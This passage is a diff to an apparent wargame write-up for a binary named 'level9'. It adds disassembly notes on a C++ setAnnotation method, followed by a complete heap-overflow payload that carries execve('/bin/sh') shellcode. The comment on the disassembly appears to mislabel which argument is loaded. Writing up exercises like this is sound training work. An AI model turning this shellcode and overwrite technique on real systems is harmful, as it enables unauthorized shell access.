@@ -71,6 +71,19 @@ offset = p/d 0x804a078 - 0x804a00c = 108
 shellcode = 21
 108-21-4 = 83
 ```
+
+EDX is shifted by 4 in func setAnnotation()
+
+```
+assembler code for function _ZN1N13setAnnotationEPc:
+   
+   0x0804871f <+17>:    mov    0x8(%ebp),%edx
+   0x08048722 <+20>:    add    $0x4,%edx
+
+The instruction at 0x0804871f loads the second argument passed to the function (a pointer to a char) into EDX.
+The instruction at 0x08048722 adds 4 to EDX.
+```
+the final payload 
 ```
 ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1]')
 $ pwd
